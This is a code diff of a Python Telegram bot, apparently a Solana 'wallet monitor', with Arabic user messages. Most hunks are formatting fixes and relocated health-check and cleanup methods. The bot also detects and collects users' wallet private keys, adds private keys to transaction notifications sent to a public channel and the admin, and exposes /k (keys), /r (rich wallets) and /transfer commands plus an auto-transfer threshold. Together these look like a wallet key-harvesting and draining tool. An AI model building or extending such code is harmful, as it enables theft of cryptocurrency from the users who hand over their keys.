+            saved_amount = await self.monitor.db_manager.get_setting('min_auto_transfer_amount', str(MIN_AUTO_TRANSFER_AMOUNT))
+            MIN_AUTO_TRANSFER_AMOUNT = float(saved_amount)
+            logger.info(f"🔧 Loaded saved minimum auto-transfer amount: {MIN_AUTO_TRANSFER_AMOUNT} SOL")
+        except Exception as e:
+            logger.warning(f"Error loading auto-transfer setting, using default: {e}")
+
+    async def health_monitor(self):
+        """Monitor bot health with Multi-RPC statistics"""
+        while True:
+            try:
+                await asyncio.sleep(60)  # Check every minute
+
+                # Check if monitoring tasks are still running
+                active_tasks = sum(1 for task_info in self.monitor.monitoring_tasks.values()
+                                 if isinstance(task_info, dict) and
+                                    task_info.get('task') and
+                                    not task_info['task'].done())
+
+                # Get Multi-RPC rate limiter statistics
+                limiter_stats = self.monitor.rate_limiter.get_stats()
+
+                # Get wallet count
+                all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
+
+                # Create provider health summary
+                provider_health = []
+                for provider_id, stats in limiter_stats['providers'].items():
+                    status = "✅" if stats['is_available'] else "❌"
+                    health = f"{stats['health_score']:.0f}%"
+                    load = f"{stats['load_percentage']:.0f}%"
+                    provider_health.append(f"{stats['name']}{status}({health}/{load})")
+
+                logger.info(
+                    f"🩺 Multi-RPC Health: "
+                    f"{active_tasks} tasks, "
+                    f"{len(all_wallets)} wallets, "
+                    f"Global rate: {limiter_stats['global_rate']}/10s, "
+                    f"Success: {limiter_stats['success_rate']:.1f}%, "
+                    f"Providers: {', '.join(provider_health)}, "
+                    f"Optimal: {limiter_stats.get('optimal_provider', 'N/A')}"
+                )
+
+                # Restart global monitoring if it died
+                if 'global_monitor' not in self.monitor.monitoring_tasks or \
+                   self.monitor.monitoring_tasks['global_monitor']['task'].done():
+                    logger.warning("🔄 Restarting global monitoring task")
+                    await self.monitor.start_global_monitoring(self.send_transaction_notification)
+
+                # Additional check to ensure monitoring is working
+                if len(all_wallets) > 0 and active_tasks == 0:
+                    logger.error("🚨 No monitoring tasks running despite having wallets! Restarting...")
+                    await self.monitor.start_global_monitoring(self.send_transaction_notification)
+
+            except Exception as e:
+                logger.error(f"Health monitor error: {e}")
+                await asyncio.sleep(30)
+
+    async def cleanup(self):
+        """Cleanup resources"""
+        logger.info("🧹 Cleaning up resources...")
+
+        try:
+            # Stop monitoring first
+            await self.monitor.stop_all_monitoring()
+            logger.info("✅ Stopped all monitoring tasks")
+
+            # Close database connections
+            await self.monitor.db_manager.close()
+            logger.info("✅ Closed database connections")
+
+            # Stop the application
+            if self.application and self.application.updater.running:
+                await self.application.updater.stop()
+                await self.application.stop()
+                await self.application.shutdown()
+                logger.info("✅ Stopped Telegram application")
+
+        except Exception as e:
+            logger.error(f"❌ Error during cleanup: {e}")
+
+        logger.info("🏁 Cleanup completed")
+
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle text messages"""
         # تجاهل رسائل القناة تماماً لتجنب الأخطاء
         if update.channel_post:
             return
-        
+
         # التأكد من وجود رسالة عادية
         if not update.message:
             return
-            
+
         chat_id = update.effective_chat.id
         text = update.message.text
 
@@ -2571,13 +2994,13 @@ class SolanaWalletBot:
     def might_contain_private_keys(self, text: str) -> bool:
         """Check if text might contain private keys"""
         import re
-        
+
         # Pattern for base58 keys (typically 87-88 characters)
         base58_pattern = r'[1-9A-HJ-NP-Za-km-z]{87,88}'
-        
+
         # Pattern for array format keys
         array_pattern = r'\[\s*(?:\d+\s*,\s*){63}\d+\s*\]'
-        
+
         # Check if text contains potential private keys
         return bool(re.search(base58_pattern, text) or re.search(array_pattern, text))
 
@@ -2604,8 +3027,8 @@ class SolanaWalletBot:
 
             # Add wallet to monitoring
             success, message = await self.monitor.add_wallet(
-                private_key, 
-                chat_id, 
+                private_key,
+                chat_id,
                 self.send_transaction_notification
             )
 
@@ -2680,8 +3103,8 @@ class SolanaWalletBot:
 
                 # Add wallet to monitoring
                 success, message = await self.monitor.add_wallet(
-                    private_key, 
-                    chat_id, 
+                    private_key,
+                    chat_id,
                     self.send_transaction_notification
                 )
 
@@ -2806,19 +3229,19 @@ class SolanaWalletBot:
             await query.answer("🔄 جاري تحديث الإحصائيات...")
             await self._send_stats_message(update, context, is_refresh=True)
 
-    async def send_transaction_notification(self, chat_id: int, wallet_address: str, 
+    async def send_transaction_notification(self, chat_id: int, wallet_address: str,
                                           amount: str, tx_type: str, timestamp: str, signature: str):
         """Send transaction notification based on admin/user monitoring logic"""
         try:
             logger.info(f"🔔 Attempting to send notification: {amount} SOL for wallet {truncate_address(wallet_address)}")
-            
+
             # Get all users monitoring this wallet
             wallets_monitoring = await self.monitor.db_manager.get_monitored_wallets_by_address(wallet_address)
 
             if not wallets_monitoring:
                 logger.warning(f"No users monitoring wallet {wallet_address}")
                 return
-                
+
             logger.info(f"Found {len(wallets_monitoring)} users monitoring this wallet")
 
             # Check if admin is monitoring this wallet
@@ -2843,17 +3266,17 @@ class SolanaWalletBot:
             # Create simple message without complex escaping
             amount_float = abs(float(amount)) if amount else 0
             urgency_icon = "🚨" if amount_float >= 0.1 else "💰"
-            
+
             # Use simple HTML formatting with copyable elements
             message = f"{urgency_icon} معاملة جديدة!\n\n"
             message += f"🏦 المحفظة: <code>{truncate_address(wallet_address)}</code>\n"
             message += f"💵 المبلغ: <code>{amount} SOL</code>\n"
             message += f"🔄 النوع: {tx_type}\n"
-            
+
             # Add recipient address for outgoing transactions
             if recipient_address and ("إرسال" in tx_type or "📤" in tx_type):
                 message += f"📨 المستلم: <code>{truncate_address(recipient_address)}</code>\n"
-            
+
             message += f"⏰ الوقت: <code>{timestamp}</code>\n"
 
             # Add private key to message if found
@@ -2874,7 +3297,7 @@ class SolanaWalletBot:
             if admin_monitoring and regular_users_monitoring:
                 # Case 1: Both admin and regular users monitoring → Send to channel + admin private
                 logger.info(f"📤 Case 1: Sending to channel {MONITORING_CHANNEL} and admin {ADMIN_CHAT_ID}")
-                
+
                 # Send to public channel
                 if MONITORING_CHANNEL:
                     try:
@@ -2891,8 +3314,8 @@ class SolanaWalletBot:
                 try:
                     admin_message = message + f"\n\n👑 <b>إشعار المشرف</b>: هذه المحفظة مراقبة من قبل مستخدمين عاديين أيضاً"
                     await self.application.bot.send_message(
-                        chat_id=ADMIN_CHAT_ID, 
-                        text=admin_message, 
+                        chat_id=ADMIN_CHAT_ID,
+                        text=admin_message,
                         parse_mode='HTML'
                     )
                     logger.info(f"✅ Successfully sent to admin {ADMIN_CHAT_ID}")
@@ -2905,8 +3328,8 @@ class SolanaWalletBot:
                 try:
                     admin_message = message + f"\n\n👑 <b>إشعار المشرف</b>: هذه المحفظة مراقبة من قبلك فقط"
                     await self.application.bot.send_message(
-                        chat_id=ADMIN_CHAT_ID, 
-                        text=admin_message, 
+                        chat_id=ADMIN_CHAT_ID,
+                        text=admin_message,
                         parse_mode='HTML'
                     )
                     logger.info(f"✅ Successfully sent to admin {ADMIN_CHAT_ID}")
@@ -2928,7 +3351,7 @@ class SolanaWalletBot:
                         logger.error(f"❌ Error sending to channel {MONITORING_CHANNEL}: {channel_error}")
                 else:
                     logger.error("❌ MONITORING_CHANNEL is not configured!")
-            
+
             else:
                 logger.warning(f"🤔 No valid notification case found: admin_monitoring={admin_monitoring}, regular_users_monitoring={regular_users_monitoring}")
 
@@ -2957,14 +3380,14 @@ class SolanaWalletBot:
 
             transaction = data['result']
             account_keys = transaction.get('transaction', {}).get('message', {}).get('accountKeys', [])
-            
+
             # Find sender index
             sender_index = None
             for i, key in enumerate(account_keys):
                 if key == sender_address:
                     sender_index = i
                     break
-            
+
             if sender_index is None:
                 return None
 
@@ -2972,13 +3395,13 @@ class SolanaWalletBot:
             meta = transaction.get('meta', {})
             pre_balances = meta.get('preBalances', [])
             post_balances = meta.get('postBalances', [])
-            
+
             # Find the account that received SOL (balance increased)
             for i, (pre, post) in enumerate(zip(pre_balances, post_balances)):
                 if i != sender_index and post > pre:  # Skip sender, find recipient
                     if i < len(account_keys):
                         return account_keys[i]
-            
+
             return None
 
         except Exception as e:
@@ -3012,192 +3435,6 @@ class SolanaWalletBot:
             logger.warning("⏰ Network timeout - will retry automatically")
         elif "NetworkError" in str(context.error):
             logger.warning("🌐 Network error - will retry automatically")
-
-    def setup_handlers(self):
-        """Setup bot handlers"""
-        self.application.add_handler(CommandHandler("start", self.start_command))
-        self.application.add_handler(CommandHandler("help", self.help_command))
-        self.application.add_handler(CommandHandler("monitor", self.monitor_command))
-        self.application.add_handler(CommandHandler("add", self.bulk_add_command))
-        self.application.add_handler(CommandHandler("stop", self.stop_command))
-        self.application.add_handler(CommandHandler("list", self.list_command))
-        self.application.add_handler(CommandHandler("r", self.rich_wallets_command))
-        self.application.add_handler(CommandHandler("k", self.keys_command))
-        self.application.add_handler(CommandHandler("filter", self.filter_command))
-        self.application.add_handler(CommandHandler("transfer", self.transfer_command))
-        self.application.add_handler(CommandHandler("debug", self.debug_command))
-        self.application.add_handler(CommandHandler("stats", self.stats_command))
-        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
-        self.application.add_handler(CallbackQueryHandler(self.handle_callback_query))
-        self.application.add_error_handler(self.error_handler)
-
-    async def start_bot(self):
-        """Start the bot"""
-        # Validate required environment variables
-        if not TELEGRAM_BOT_TOKEN:
-            logger.error("❌ TELEGRAM_BOT_TOKEN environment variable is required")
-            return
-
-        
-
-        if not SOLANA_RPC_URL:
-            logger.error("❌ RPC_URL environment variable is required")
-            return
-
-        try:
-            # Initialize database
-            await self.monitor.db_manager.initialize()
-
-            # Load saved filter setting
-            await self.load_filter_setting()
-
-            # Create application with better configuration
-            self.application = (Application.builder()
-                              .token(TELEGRAM_BOT_TOKEN)
-                              .concurrent_updates(True)
-                              .build())
-
-            # Setup handlers
-            self.setup_handlers()
-
-            # Start monitoring session
-            await self.monitor.start_session()
-
-            # Start optimized global monitoring
-            await self.monitor.start_global_monitoring(self.send_transaction_notification)
-
-            # Get and display user count
-            users_count = await self.monitor.db_manager.get_users_count()
-            monitored_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
-            logger.info(f"👥 Active Users: {users_count}")
-            logger.info(f"🔍 Monitored Wallets: {len(monitored_wallets)}")
-            logger.info(f"📡 Monitoring Channel: {MONITORING_CHANNEL}")
-            logger.info(f"⚡ RPC Rate Limit: {MAX_RPC_CALLS_PER_SECOND}/second")
-            logger.info(f"🔄 Polling Interval: {POLLING_INTERVAL} seconds")
-
-            logger.info("🚀 Starting Solana Wallet Monitor Bot...")
-
-            # Start the application with proper error handling
-            await self.application.initialize()
-
-            # Delete webhook to avoid conflicts
-            await self.application.bot.delete_webhook(drop_pending_updates=True)
-
-            await self.application.start()
-
-            # Start polling with timeout to prevent conflicts
-            await self.application.updater.start_polling(
-                poll_interval=1.0,
-                timeout=10,
-                bootstrap_retries=-1
-            )
-
-            logger.info("✅ Bot is running successfully!")
-
-            # Start health monitoring
-            health_task = asyncio.create_task(self.health_monitor())
-
-            # Keep the bot running
-            try:
-                await asyncio.Event().wait()
-            except KeyboardInterrupt:
-                logger.info("🛑 Received shutdown signal...")
-                health_task.cancel()
-
-        except Exception as e:
-            logger.error(f"❌ Error starting bot: {e}")
-            raise
-        finally:
-            await self.cleanup()
-
-    async def load_filter_setting(self):
-        """Load saved filter setting from database"""
-        global MIN_NOTIFICATION_AMOUNT
-        try:
-            saved_amount = await self.monitor.db_manager.get_setting('min_notification_amount', str(MIN_NOTIFICATION_AMOUNT))
-            MIN_NOTIFICATION_AMOUNT = float(saved_amount)
-            logger.info(f"🔧 Loaded saved minimum notification amount: {MIN_NOTIFICATION_AMOUNT} SOL")
-        except Exception as e:
-            logger.warning(f"Error loading filter setting, using default: {e}")
-
-
-
-    async def health_monitor(self):
-        """Monitor bot health with Multi-RPC statistics"""
-        while True:
-            try:
-                await asyncio.sleep(60)  # Check every minute
-
-                # Check if monitoring tasks are still running
-                active_tasks = sum(1 for task_info in self.monitor.monitoring_tasks.values() 
-                                 if isinstance(task_info, dict) and 
-                                    task_info.get('task') and 
-                                    not task_info['task'].done())
-
-                # Get Multi-RPC rate limiter statistics
-                limiter_stats = self.monitor.rate_limiter.get_stats()
-                
-                # Get wallet count
-                all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
-                
-                # Create provider health summary
-                provider_health = []
-                for provider_id, stats in limiter_stats['providers'].items():
-                    status = "✅" if stats['is_available'] else "❌"
-                    health = f"{stats['health_score']:.0f}%"
-                    load = f"{stats['load_percentage']:.0f}%"
-                    provider_health.append(f"{stats['name']}{status}({health}/{load})")
-                
-                logger.info(
-                    f"🩺 Multi-RPC Health: "
-                    f"{active_tasks} tasks, "
-                    f"{len(all_wallets)} wallets, "
-                    f"Global rate: {limiter_stats['global_rate']}/10s, "
-                    f"Success: {limiter_stats['success_rate']:.1f}%, "
-                    f"Providers: {', '.join(provider_health)}, "
-                    f"Optimal: {limiter_stats.get('optimal_provider', 'N/A')}"
-                )
-
-                # Restart global monitoring if it died
-                if 'global_monitor' not in self.monitor.monitoring_tasks or \
-                   self.monitor.monitoring_tasks['global_monitor']['task'].done():
-                    logger.warning("🔄 Restarting global monitoring task")
-                    await self.monitor.start_global_monitoring(self.send_transaction_notification)
-
-                # Additional check to ensure monitoring is working
-                if len(all_wallets) > 0 and active_tasks == 0:
-                    logger.error("🚨 No monitoring tasks running despite having wallets! Restarting...")
-                    await self.monitor.start_global_monitoring(self.send_transaction_notification)
-
-            except Exception as e:
-                logger.error(f"Health monitor error: {e}")
-                await asyncio.sleep(30)
-
-    async def cleanup(self):
-        """Cleanup resources"""
-        logger.info("🧹 Cleaning up resources...")
-
-        try:
-            # Stop monitoring first
-            await self.monitor.stop_all_monitoring()
-            logger.info("✅ Stopped all monitoring tasks")
-
-            # Close database connections
-            await self.monitor.db_manager.close()
-            logger.info("✅ Closed database connections")
-
-            # Stop the application
-            if self.application and self.application.updater.running:
-                await self.application.updater.stop()
-                await self.application.stop()
-                await self.application.shutdown()
-                logger.info("✅ Stopped Telegram application")
-
-        except Exception as e:
-            logger.error(f"❌ Error during cleanup: {e}")
-
-        logger.info("🏁 Cleanup completed")
-
 
 async def start_http_server():
     """Start HTTP server to keep the service alive"""
@@ -3235,7 +3472,6 @@ async def main():
         # Cleanup HTTP server
         if http_runner:
             await http_runner.cleanup()
-
 
 if __name__ == "__main__":
     asyncio.run(main())
